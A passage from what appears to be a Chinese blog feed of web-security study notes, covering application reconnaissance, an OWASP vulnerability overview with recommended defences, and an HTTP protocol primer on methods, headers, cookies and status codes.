title="会话令牌"></a>会话令牌</h4><p>许多Web服务器和Web应用程序平台默认使用的会话令牌也揭示其所使用技术的信息</p><pre class=" language-bash"><code class="language-bash">JSESSIONID--java平台ASPSESSIONID--Microsoft IIS服务器CFID/CFTOKEN--Cold Fusion </code></pre><h4 id="第三方代码组件"><a href="#第三方代码组件" class="headerlink" title="第三方代码组件"></a>第三方代码组件</h4><p>许多Web应用程序整合第三方代码组件执行常见的功能，如购物车、登陆机制和公告牌，可以根据这些组件了解应用程序的功能。</p><h3 id="确定服务器端功能"><a href="#确定服务器端功能" class="headerlink" title="确定服务器端功能"></a>确定服务器端功能</h3><p>通过留意应用程序向客户端披露的线索，通常可推断与服务器功能和结构有关的大量信息</p><h4 id="仔细分析请求"><a href="#仔细分析请求" class="headerlink" title="仔细分析请求"></a>仔细分析请求</h4><pre class=" language-bash"><code class="language-bash">https://wahh-app.com/workbench.aspx?template<span class="token operator">=</span>NewBranch.tpl<span class="token operator">&amp;</span>loc<span class="token operator">=</span>/default<span class="token operator">&amp;</span>ver<span class="token operator">=</span>2.31<span class="token operator">&amp;</span>edit<span class="token operator">=</span>false</code></pre><ol><li>这里的.aspx表示这是一个ASP.NET的应用程序</li><li>template很可能用于指定一个文件名</li><li>loc参数很可能用于指定一个目录</li><li>文件扩展名.tpl证明了以上推论</li><li>/default很有可能是一个目录名称</li><li>应用程序可能获得指定的模板文件，并将其内容包含在响应中</li><li>edit设置为假，将这个值更改为真会修改注册功能</li><li>ver参数不能推断出任何有用的线索，但修改这个参数可能会使应用程序执行一组可被攻击者利用的不同功能。</li></ol><h4 id="推测应用程序的行为"><a href="#推测应用程序的行为" class="headerlink" title="推测应用程序的行为"></a>推测应用程序的行为</h4><p>应用程序以统一的方式执行其全部功能，这可能是不同的功能由统一为开发者编写，或者可以遵循统一的设计规范，或者共享相同的代码组件，在这种情况下，我们可以轻松推断出服务器端某个领域的功能，并据此类推其他领域的功能。</p><h4 id="隔离独特的应用程序行为"><a href="#隔离独特的应用程序行为" class="headerlink" title="隔离独特的应用程序行为"></a>隔离独特的应用程序行为</h4><p>许多可靠或成熟的应用程序采用一致的框架来防止各种类型的攻击，在这类情况下，最可能发现漏洞的区域，是应用程序中后续添加或“拼接”而其常规安全框架不会处理的部分。</p><h3 id="解析受攻击面"><a href="#解析受攻击面" class="headerlink" title="解析受攻击面"></a>解析受攻击面</h3>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP漏洞分析</title>
      <link href="/2019/10/17/owasp1/"/>
      <url>/2019/10/17/owasp1/</url>
      
        <content type="html"><![CDATA[<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>注入往往是应用程序缺少对用户输入的安全性检查，攻击者把包含指令的数据发送给解释器，解释器会把收到的数据转换成指令执行。<br>(注入详解请参阅Web安全(8))</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>数据泄露</li><li>数据丢失或损坏</li><li>拒绝服务</li><li>提高访问权限甚至控制主机</li></ul><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ul><li>使用安全的API(ESAPI)，避免使用解释器</li><li>对输入的特殊字符进行转义处理</li><li>使用白名单</li></ul><blockquote><p>注：ESAPI(Enterprise Security API)是为编写出更加安全的代码设计出来的一些API</p></blockquote><h2 id="失效的身份认证和会话管理"><a href="#失效的身份认证和会话管理" class="headerlink" title="失效的身份认证和会话管理"></a>失效的身份认证和会话管理</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>与认证和会话管理相关的应用程序功能往往得不到正确的实施，这就导致攻击者破坏密码、密钥、会话令牌或利用实施漏洞冒充其他用户身份。</p><h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><p>导致部分甚至全部账户遭受攻击，一旦攻击成功，攻击者能执行合法用户的任何操作，因此特权账户会造成更大的破坏。</p><h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><ul><li>使用内置的会话管理</li><li>通过认证的问候：使用单一的入口点、确保在一开始登录SSL保护的网页</li></ul><h2 id="跨站"><a href="#跨站" class="headerlink" title="跨站"></a>跨站</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>当Web应用程序在发送给浏览器的的页面中包含用户提供的数据，但没有经过适当验证或转译，就会导致跨站点脚本漏洞。(详情请参阅Web安全(10))</p><h3 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h3><p>攻击者能在受害者浏览器中执行脚本以劫持用户会话、迫害网址、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器等等。</p><h3 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h3><ul><li>验证输入</li><li>使用ESAPI</li><li>编码输出：确保字符被视为数据而不是作为HTML元字符被浏览器解析</li></ul><blockquote><p>注：需要编码的部分：HTML实体、HTML属性、Javascript、CSS、URL</p></blockquote><h2 id="不安全的对象直接引用"><a href="#不安全的对象直接引用" class="headerlink" title="不安全的对象直接引用"></a>不安全的对象直接引用</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>不安全的对象引用(Insecure direct object reference),意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到原本其并没有得到授权的的对象。Web应用往往在生成Web页面时会用真实名字，且不会对所有目的对象访问时来检查用户权限，所以这就早曾不安全的对象直接引用的漏洞。</p><h3 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h3><p>损害参数所引用的所有数据。除非名字空间很稀疏，否则攻击者很容易访问该类型的所有数据</p><h3 id="防范-3"><a href="#防范-3" class="headerlink" title="防范"></a>防范</h3><ul><li>使用基于用户或会话的间接对象访问，这样能防止攻击者直接攻击未授权资源</li><li>访问检查：对任何来自不受信任的源所使用的所有直接对象引用都进行访问控制检测，这样才能确保用户对要求的对象有访问权限</li><li>避免在URL或网页中直接引用内部文件名或数据库关键字</li><li>可使用自定义的映射名称来取代直接对象名</li><li>锁定网站服务器上所有的目录和文件夹，设置访问权限</li><li>验证用户输入和URL请求，拒绝./或../的请求</li></ul><p>本文参考连接<a href="https://blog.csdn.net/lifetragedy/article/details/52573897" target="_blank" rel="noopener"></a></p><h2 id="伪造跨站请求-CSRF"><a href="#伪造跨站请求-CSRF" class="headerlink" title="伪造跨站请求(CSRF)"></a>伪造跨站请求(CSRF)</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p>CSRF是利自动用了网站运行攻击者预测特定操作的所有细节这一特点。由于浏览器发送会话cookie等认证凭证，导致攻击者能够创建恶意的Web页面来产生伪造请求。<br>CSRF与XSS的不同在于XSS直接利用的是站内信任的用户，而CSRF则是通过伪装信任用户的请求来利用网站。</p><h3 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h3><ul><li>攻击者可以冒充用户执行任何用户被允许的操作</li></ul><h3 id="防范-4"><a href="#防范-4" class="headerlink" title="防范"></a>防范</h3><ul><li>给每个HTTP请求添加一个不可预测的令牌，并保证该令牌对每个用户会话来说是唯一性的。最好的办法就是将独有的令牌包含在隐藏字段中，通过HTTP请求发送，避免在URL中暴露出来</li><li>要求用户重新验证或判断他们是一个真实的用户</li></ul><h2 id="安全误配置"><a href="#安全误配置" class="headerlink" title="安全误配置"></a>安全误配置</h2><h3 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h3><p>安全配置错误可以发生在一个应用程序堆栈的任何层面，攻击者可以通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问</p><h3 id="危害-5"><a href="#危害-5" class="headerlink" title="危害"></a>危害</h3><p>系统可能在未知的情况下被完全攻破，用户数据可能随着时间推移而被全部盗走或篡改，甚至导致系统的崩坏。</p><h3 id="防范-5"><a href="#防范-5" class="headerlink" title="防范"></a>防范</h3><ul><li>自动化安装部署，保证开发、QA、产品环境的配置尽量相同，减少部署一个新的安全环境的耗费</li><li>及时了解并部署每个环境的软件更新和补丁信息</li><li>使用提供有效分离和安全性强大的应用程序框架</li><li>使用漏洞扫描和安全审计，以帮助检查错误的配置或未安装的补丁</li></ul><h2 id="限制URL访问失败"><a href="#限制URL访问失败" class="headerlink" title="限制URL访问失败"></a>限制URL访问失败</h2><h3 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h3><p>限制URL访问失败也是与认证相关的，与不安全的直接对象引用相类似，但不同在于这个漏洞是系统已经对URL的访问做了限制，但这种限制却实际并没有生效。常见的错误是，我们在用户认证后只显示给用户认证过的页面和菜单选项，而实际上这些仅仅是表示层的访问控制而不能真正生效，攻击者很容易就能伪造请求直接访问未被授权的页面</p><h3 id="危害-6"><a href="#危害-6" class="headerlink" title="危害"></a>危害</h3><p>攻击者很容易就把网址改成享有特权的网页，这样就可以使用匿名或普通用户访问未受保护的私人页面，从而提升未授权功能和相关数据信息</p><h3 id="防范-6"><a href="#防范-6" class="headerlink" title="防范"></a>防范</h3><ul><li>检查管理权限的过程并确保能够容易进行升级和审计，切忌硬编码</li><li>默认缺省情况下，应拒绝所有访问的执行权限。对于每个功能的访问，需要明确的角色和授权</li><li>检查每个功能分配的权限合理有效</li></ul><h2 id="未验证的重定向和转发"><a href="#未验证的重定向和转发" class="headerlink" title="未验证的重定向和转发"></a>未验证的重定向和转发</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h3><ul><li>在Web应用中重定向极为普遍，如果重定向未被验证，那么攻击者就可以引导用户访问他们所要用户访问的站点</li><li>本质上转发是在同一个应用中对一个新页面发送请求，并且有时是用参数来定义目标页面的，同样，如果参数未被验证，那么攻击者就可以利用其来绕过认证或授权检查。</li></ul><h3 id="危害-7"><a href="#危害-7" class="headerlink" title="危害"></a>危害</h3><p>攻击者通过重定向可以安装恶意软件或者诱使受害人泄露密码等敏感信息，通过转发可以绕过访问控制</p><h3 id="防范-7"><a href="#防范-7" class="headerlink" title="防范"></a>防范</h3><ul><li>浏览代码中含有重定向和转发的内容，看目的URL中是否包含用户输入的参数，如果包含检查目标参数是否在白名单内，必要时需要重新定义目的URL</li><li>通过点击操作网站，观察是否产生重定向，观察在重定向之前用户输入的参数有没有出现在某一个URL或很多URL中，如果是这种情况，需要改变URL的目标</li><li>如果测试中没有代码，检查所有参数，测试哪些看起来像是重定向或转发的页面</li></ul><h2 id="应用已知脆弱性的组件"><a href="#应用已知脆弱性的组件" class="headerlink" title="应用已知脆弱性的组件"></a>应用已知脆弱性的组件</h2><h3 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h3><p>组件，比如：库文件、框架和其他软件模块，几乎以全部的权限运行。如果一个带有漏洞的权限被利用，这种攻击可以造成更为严重的数据丢失或服务器接管。</p><h3 id="防范-8"><a href="#防范-8" class="headerlink" title="防范"></a>防范</h3><ul><li>识别正在使用的组件和版本，包括所有依赖</li><li>监控这些在公共数据库中、项目的邮件列表、以及安全邮件列表的组件的安全性，并保持他们更新到最新</li><li>建立安全策略来管理组件的使用</li></ul><h2 id="敏感信息暴露"><a href="#敏感信息暴露" class="headerlink" title="敏感信息暴露"></a>敏感信息暴露</h2><h3 id="概述-9"><a href="#概述-9" class="headerlink" title="概述"></a>概述</h3><p>Web程序没有正确保护敏感数据</p><h3 id="防范-9"><a href="#防范-9" class="headerlink" title="防范"></a>防范</h3><ul><li>对个人信息进行加密</li><li>采用SSL加密通道</li><li>敏感信息禁止明文传递到Web客户端</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
            <tag> OWASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(2)</title>
      <link href="/2019/10/15/websecurity2/"/>
      <url>/2019/10/15/websecurity2/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><ul><li>HTTP(HyperText Transfer Protocol，超文本传输协议)：是访问万维网使用的核心通信协议</li><li>HTTP使用一种基于消息的模型：客户端发送一条请求消息，而后服务器返回一条响应消息</li><li>该协议基本不需要连接，虽然HTTP使用有状态的TCP协议作为它的传输机制，但每次请求与响应交换都自动完成，并且可能使用不同的TCP连接</li></ul><h3 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h3><p>所有HTTP消息(请求与响应)中都包含一个或几个单行显示的消息头(header)，然后是一个强制空白行，最后是消息主体(可选)</p><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><pre class=" language-bash"><code class="language-bash">//请求方法<span class="token punctuation">(</span>get<span class="token punctuation">)</span>+空格+url<span class="token punctuation">(</span><span class="token punctuation">)</span>+空格+协议版本<span class="token punctuation">(</span>HTTP/1.1<span class="token punctuation">)</span>//常用的HTTP版本为1.0和1.1，1.1版本必须使用Host请求头//GET请求没有消息主体，因此在消息头后的空白行中没有其他数据GET https://testrail-tools.trendmicro.com/portal/admin/getTimerInitStatus HTTP/1.1    //从第二行开始到第十行<span class="token punctuation">(</span>Accept-Cookie<span class="token punctuation">)</span>都是请求头部//Accept：表示客户端接受的内容类型，按照先后顺序表示客户端接收数据的先后次序Accept: application/json, text/javascript, */*<span class="token punctuation">;</span> q<span class="token operator">=</span>0.01//以x开头的是非http标准，一般是某种技术的出现而定义的；这里是用来判断是http请求还是ajax请求。X-Requested-With: XMLHttpRequest//Referer消息头用于表示发出请求的原始URLReferer: https://testrail-tools.trendmicro.com/portal/admin/toLicenseTimerConfig?id<span class="token operator">=</span>7//客户端接受内容返回优先选择的语言Accept-Language: zh-CN//客户端可以接受的服务器对返回内容进行编码压缩的格式。Accept-Encoding: gzip, deflate//客户端运行的浏览器类型信息User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> Trident/7.0<span class="token punctuation">;</span> rv:11.0<span class="token punctuation">)</span> like Gecko//Host消息头用于指定出现在被访问的完整URL中的主机名称Host: testrail-tools.trendmicro.com//表示是否需要持续连接Connection: Keep-Alive//Cookie消息头用于提交服务器向客户端发布的其他参数Cookie: _ga<span class="token operator">=</span>GA1.2.1909963682.1524537669<span class="token punctuation">;</span> _gid<span class="token operator">=</span>GA1.2.563928490.1529501401//空行//消息主体</code></pre><blockquote><p>注：消息头会在下文进行详细解释</p></blockquote><h4 id="GET请求的响应"><a href="#GET请求的响应" class="headerlink" title="GET请求的响应"></a>GET请求的响应</h4><pre class=" language-bash"><code class="language-bash">//状态行//使用的HTTP版本+空格+请求结果的数字状态码+空格+原因短语//200是最常用的状态码，它表示成功提交了请求，正在返回所请求的资源HTTP/1.1 200 OK//包含处理请求的服务器信息，包含多个产品注释和标识。Server: Apache-Coyote/1.//告知缓存机制是否可以缓存和类型，private是只能当前用户，不能被共享。Cache-Control: private//响应过期时间Expires: Wed, 31 Dec 1969 16:00:00 PST//application配置，这里表示读取的是application-prod.propertiesX-Application-Context: application:prod//返回数据的类型和字符编码格式Content-Type: application/json<span class="token punctuation">;</span>charset<span class="token operator">=</span>UTF-8//告知接收端，报文采取了何种编码，chunked表示服务器无法确定消息大小，一般比如下载等，就采用chunked。Transfer-Encoding: chunked//返回消息的时间Date: Wed, 20 Jun 2018 15:00:16 GMT//空行//响应正文<span class="token punctuation">{</span><span class="token string">"advancewarn"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"userstatus"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"ldap"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"licensealarm"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"deltempzipfile"</span><span class="token keyword">:</span><span class="token string">"1"</span>,<span class="token string">"sctmlicense"</span><span class="token keyword">:</span><span class="token string">"0"</span>,<span class="token string">"user"</span><span class="token keyword">:</span><span class="token string">"1"</span><span class="token punctuation">}</span></code></pre><h3 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h3><h4 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h4><ul><li>GET方法的作用在于获取资源</li><li>可以用URL查询字符串的形式向请求的资源发送参数(URL中?后的部分为查询字符串)。这使用户可将一个包含动态资源的URL标注为书签，。</li><li>用户或其他用户可重复利用该书签来获取等价的资源。</li><li>URL显示在屏幕上并记录在许多地方，因此，请勿使用查询字符串传送任何敏感信息。</li></ul><h4 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h4><ul><li>POST方法的主要作用是执行操作。</li><li>使用此方法可以在查询字符串和消息主体中发送请求参数。</li><li>仍然可以将URL标注为书签，但书签中不包含消息主体发送的任何参数。</li></ul><h4 id="HEAD方法"><a href="#HEAD方法" class="headerlink" title="HEAD方法"></a>HEAD方法</h4><ul><li>与GET方法类似</li><li>与GET方法不同之处在于服务器不会在响应中返回消息主体。</li><li>服务器返回的信息头应与对应GET请求返回的消息头相同。</li><li>这种方法可用于检查某一资源在向其提交GET请求之前是否存在。</li></ul><h4 id="TRACE方法"><a href="#TRACE方法" class="headerlink" title="TRACE方法"></a>TRACE方法</h4><ul><li>这种方法主要用于诊断</li><li>服务器应在响应主体中返回其收到的请求消息的具体内容。</li><li>这种方法主要用于检测客户端和服务器之间是否存在任何操纵请求的代理服务器</li></ul><h4 id="OPTIONS方法"><a href="#OPTIONS方法" class="headerlink" title="OPTIONS方法"></a>OPTIONS方法</h4><ul><li>这种方法要求服务器报告对某一特殊资源有用的HTTP方法</li><li>服务器通常返回一个包含Allow消息头的响应，并在其中列出所有有效方法。</li></ul><h4 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h4><ul><li>这个方法试图使用包含在请求主体中的内容，向服务器上传指定的资源。</li><li>如果激活这个方法，渗透测试员就可以利用它来攻击应用程序</li></ul><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>URL格式解析：<br><font color="#fb8c00">http:\host[:port][abs_path][:parameters][?query]#fragment</font></p><p>例如：<a href="http://www.abc.com:80/WebApplication1/WebForm1.aspx?name=tom&amp;;age=20#resume" target="_blank" rel="noopener">http://www.abc.com:80/WebApplication1/WebForm1.aspx?name=tom&amp;;age=20#resume</a></p><ul><li><font color="#fb8c00">http</font>表示要通过HTTP协议来定位网络资源。</li><li><font color="#fb8c00">host</font>表示合法的因特网主机域名或者IP地址。</li><li><font color="#fb8c00">port</font>用于表示在传输层上交换信息的进程端口号，http协议默认端口号为80，当然采用不同的协议默认端口号不同。</li><li><font color="#fb8c00">abs_path</font>指定请求资源的URI（统一资源定位符）。</li><li><font color="#fb8c00">parameters</font>参数用于指定特殊参数的可选项。</li><li><font color="#fb8c00">?query</font>可选，用于给动态网页(使用PHP/JSP等制作的网页)传递参数，可以有多个参数，用“&amp;”符号隔开，每个参数的键值之间用‘=’隔开。</li></ul><p>在上述实例中<br>http是协议，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是服务器，80是HTTP协议默认端口号，/WebApplication1/WebForm1.aspx是服务器上存放该资源的路径， query=”name=tom&amp;;age=20#resume”是动态网页查询</p><p>###　REST<br>表述性状态转移(REST)是分布式系统的一种体系架构，在这类体系架构中，请求和响应包含系统资源当前状态的表述。万维网，包括HTTP协议和URL格式中使用的核心技术，均符合REST体系架构的风格。<br>“REST风格的URL”一词通常指在URL文件路径而非查询字符串中包含参数的URL。<br>包含查询字符串的URL</p><pre class=" language-bash"><code class="language-bash">http://wahh-app.com/seacher?make<span class="token operator">=</span>ford<span class="token operator">&amp;</span>model<span class="token operator">=</span>pinto</code></pre><p>REST风格参数的URL：</p><pre class=" language-bash"><code class="language-bash">http://wahh-app.com/seacher/ford/pinto</code></pre><h3 id="HTTP消息头"><a href="#HTTP消息头" class="headerlink" title="HTTP消息头"></a>HTTP消息头</h3><h4 id="常用消息头"><a href="#常用消息头" class="headerlink" title="常用消息头"></a>常用消息头</h4><ul><li><font color="#fb8c00">Connection</font> 这个消息头用于告诉通信的另一端，在完成HTTP传输后是关闭TCP连接还是保持连接开放以接收其他信息。</li><li><font color="#fb8c00">Content-Encoding</font> 这个消息头为消息主体中的内容指定编码形式(如gzip)，一些应用程序使用它来压缩响应以加快传输速度</li><li><font color="#fb8c00">Content-Length</font> 这个消息头用于规定消息主体的字节长度(HEAD的响应语法例外，它在对应的GET请求的响应中指出主体长度)</li><li><font color="#fb8c00">Content-Type</font> 这个消息头用于规定消息主体的内容类型，如HTML文档的内容类型为text/html</li><li><font color="#fb8c00">Transfer-Encoding</font> 这个消息头指定为方便其通过HTTP传输而对消息主体使用的任何编码。如果使用这个消息头，通常用它指定块编码。</li></ul><h4 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h4><ul><li><font color="#fb8c00">Accept</font> 告诉服务器端客户端愿意接受哪些内容。如图像类型、办公文档格式等。</li><li><font color="#fb8c00">Accept-Encoding</font> 告诉服务器客户端愿意接受哪些内容编码</li><li><font color="#fb8c00">Authorization</font> 用于为一种内置HTTP身份验证向服务器提交证书</li><li><font color="#fb8c00">Cookie</font> 用于向服务器提交它以前发布的cookie</li><li><font color="#fb8c00">Host</font> 用于指定出现在所请求的完整URL中的主机名称。</li><li><font color="#fb8c00">If-Modified-Since</font> 说明浏览器最后一次收到所请求的资源的时间，如果自那以后资源没有发生变化，服务器就会发出一个带状态码304的响应，指示客户端使用资源的缓存副本</li><li><font color="#fb8c00">Origin</font> 这个消息用在跨域Ajax请求中，用于只是提出请求的域</li><li><font color="#fb8c00">If-None-Match</font> 用于指定一个实体标签，实体标签是一个说明消息主体内容的标识符，当最后一次收到所请求的资源时，浏览器提交服务器发布的实体标签。服务器可使用实体标签确定浏览器是否使用资源的缓存副本。</li><li><font color="#fb8c00">Referer</font> 用于指示提出当前请求的URL</li><li><font color="#fb8c00">User-Agent</font> 提供浏览器或生成请求的其他客户端软件有关的信息</li></ul><h4 id="响应消息头"><a href="#响应消息头" class="headerlink" title="响应消息头"></a>响应消息头</h4><ul><li><font color="#fb8c00">Access-Control-Allow-Origin</font> 用于指示可否通过跨域AJax请求获取资源</li><li><font color="#fb8c00">Cache-Control</font> 用于向浏览器传送缓存指令</li><li><font color="#fb8c00">ETag</font> 用于指定一个实体标签。客户端可在将来的请求中提交这个标识符，获得和If-None-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是哪个版本的资源。</li><li><font color="#fb8c00">Expires</font> 用于向浏览器说明消息主体内容的有效时间，在这个时间之前，浏览器可以使用这个资源的缓存副本。</li><li><font color="#fb8c00">Location</font> 用于在重定向响应(那些以状态码3开头的响应)中说明重定向的目标</li><li><font color="#fb8c00">Prama</font> 用于向浏览器传送缓存指令</li><li><font color="#fb8c00">Server</font> 提供所使用的Web服务器软件的相关信息</li><li><font color="#fb8c00">Set-Cookie</font> 用于向浏览器发布cookie，浏览器会在随后的请求中将其返回给服务器</li><li><font color="#fb8c00">WWW-Authenticate</font> 用在带401状态码的响应中，提供服务器所支持的身份验证类型有关信息。</li><li><font color="#fb8c00">X-Frame-Options</font> 指示浏览器框架是否及如何加载当前响应。</li></ul><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><ul><li>cookie是大多数Web应用程序所依赖的HTTP协议的一个关键组成部分，攻击者常常通过它来利用Web应用程序的漏洞。</li><li>服务器使用cookie机制向客户端发送数据，客户端保存cookie并将其返回给服务器。</li><li>与其他类型的请求参数不同(存在于URL查询字符或消息主体中)不同，无须应用程序或用户采取任何特殊措施，随后的每一个请求都会继续重新向服务器提交cookie。</li></ul><p>服务器使用Set-Cookie响应消息头发布cookie</p><pre class=" language-bash"><code class="language-bash">Set-Cookie: tracking<span class="token operator">=</span>tI8rk7joMx44S2Uu85nSWc</code></pre><p>然后，用户的浏览器自动将下面的消息头添加到随后返回的同一服务器的请求中</p><pre class=" language-bash"><code class="language-bash">Cookie: tracking<span class="token operator">=</span>tI8rk7joMx44S2Uu85nSWc</code></pre><p>如上所示，cookie一般由一个名/值对构成，但也可以包含任何不含空格的字符串，可以在服务器响应中使用几个Set-Cookie消息头发布多个cookie，，并可在同一个Cookie消息头中用分号分隔不同的cookie，将它们全部返回给服务器。</p><h4 id="cookie可选属性"><a href="#cookie可选属性" class="headerlink" title="cookie可选属性"></a>cookie可选属性</h4><p>除cookie的实际值外，Set-Cookie消息头还可包含以下任何可选属性，用它们控制浏览器处理cookie的方式</p><ul><li><font color="#fb8c00">expires</font> 用于设定cookie的有效时间，这样会使浏览器将cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么cookie仅用在当前浏览器会话中</li><li><font color="#fb8c00">domain</font> 用于指定cookie的有效域，这个域必须和收到cookie的域相同，或者是它的父域。</li><li><font color="#fb8c00">path</font> 用于指定cookie的有效URL路径</li><li><font color="#fb8c00">secure</font> 如果设置这个属性，则仅在HTTPS请求中提交cookie</li><li><font color="#fb8c00">HttpOnly</font> 如果设置这个属性，将无法通过客户端javascript直接访问cookie</li></ul><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求结果，根据代码的第一位数字，可将状态码分为以下5类：</p><ul><li><font color="#fb8c00">1xx</font> 提供信息</li><li><font color="#fb8c00">2xx</font> 请求被成功提交</li><li><font color="#fb8c00">3xx</font> 客户端被重定向到其他资源</li><li><font color="#fb8c00">4xx</font> 请求包含某种错误</li><li><font color="#fb8c00">5xx</font> 服务器执行请求时遇到错误</li></ul><h4 id="渗透测试员常见状态码"><a href="#渗透测试员常见状态码" class="headerlink" title="渗透测试员常见状态码"></a>渗透测试员常见状态码</h4><p>下面列出渗透测试员在攻击Web应用程序时最有可能遇到的状态码及相关的原因短语</p><ul><li><font color="#fb8c00">100 Continue</font> 当客户端提交一个包含主体的请求时，将发送这个响应，该响应表示已收到请求消息头，客户端应继续发送主体，请求完成后，再由服务器返回一个响应。</li><li><font color="#fb8c00">200 ok</font> 表示已成功提交请求，且响应主体中包含请求结果</li><li><font color="#fb8c00">201 Created</font> PUT请求的响应返回这个状态码，表示请求已成功提交。</li><li><font color="#fb8c00">301 Moved Permanetly</font> 本状态码将浏览器永久重定向到另一个在Location消息头中指定的URL，以后客户端应使用新的URL替换旧的URL。</li><li><font color="#fb8c00">302 Found</font> 将浏览器暂时重定向到另一个Location的消息头中指定的URL。</li><li><font color="#fb8c00">304 Not Modified</font> 指示浏览器使用缓存中保存的所请求资源的副本</li><li><font color="#fb8c00">400 Bad Request</font> 表示客户端提交了一个无效的HTTP请求</li><li><font color="#fb8c00">401 Unauthorized</font> 服务器在许可请求前要求HTTP进行身份验证</li><li><font color="#fb8c00">403 Forbidden</font> 不管是否通过身份验证，禁止任何人访问被请求的资源</li><li><font color="#fb8c00">404 Not Found</font> 表示所请求的资源不存在</li><li><font color="#fb8c00">405 Method Not Allowed</font> 表示指定的URL不支持请求中使用的方法</li><li><font color="#fb8c00">413 Request Entity Too Large</font> 如果在本地代码中探查缓冲器溢出漏洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理</li><li><font color="#fb8c00">414 Request URI Too Long</font> 表示请求中的URL过长，服务器无法处理</li><li><font color="#fb8c00">500 Internal Server Error</font> 服务器在执行时遇到错误</li><li><font color="#fb8c00">503 Service Unavailable</font> 表示尽管Web服务器运转正常，并且能够响应请求，但服务器访问的应用程序还是无法作出响应。</li></ul><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTP使用普通的非加密TCP作为其传输机制。HTTPS本质上与HTTP一样，都属于应用层协议，但HTTPS通过安全传输机制——安全套接层(Secure Socket Layer,SSL)——传送数据。这种机制可保护通过网络传送的所有数据的隐秘性和完整性，显著降低非入侵性拦截攻击的可能性。不管是否使用SSL进行传输，HTTP的请求与响应都以完全相同的方式工作。</p><h3 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h3><ul><li>HTTP代理服务器是一个协调客户端浏览器与目标Web服务器之间访问的服务器。</li><li>当配置使用代理服务器时，它会将所有的请求提交到代理服务器,代理服务器再将请求转送给相关Web服务器,并将响应返回给浏览器</li><li>大多数代理还使用其他服务，如缓存、验证与访问机制<br>如果使用代理服务器，HTTP的工作机制会出现两方面的差异</li></ul><ol><li>当浏览器向代理服务器发送HTTP请求时，它会将完整的URL(包括前缀http://与服务器主机名称，在非标准URL中，还包括端口号)插入请求中，代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标Web服务器</li><li>当使用HTTPS时，浏览器无法与代理服务器进行SSL握手，因为这样会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯粹的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络数据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个HTTP请求，并指定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标Web服务器的纯粹TCP级中继</li></ol><blockquote><p>注：从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使用它可以拦截并修改所有使用HTTPS的请求和响应。</p></blockquote><h3 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" 